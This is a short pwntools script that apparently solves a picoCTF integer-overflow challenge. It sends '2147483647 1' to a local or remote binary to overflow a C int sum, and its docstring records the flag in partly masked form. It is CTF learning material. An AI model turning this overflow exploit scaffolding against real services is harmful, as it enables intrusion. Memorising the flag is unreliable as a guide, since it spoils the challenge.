#!/usr/bin/env python3


"""
Ghidra decompile

Code provided

Attack is simply entering a value larger than a C int and 1

picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_XXXXXXXXXXX}
"""

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']


BINARY = './flag'

code = ELF(BINARY)
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    io = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
else:
    io = gdb.debug(BINARY, gdbscript = '''
                   b main
                   c
    ''')



p = log.progress("Exploiting")

payload = str('2147483647 1')

io.sendline(payload)
io.interactive()
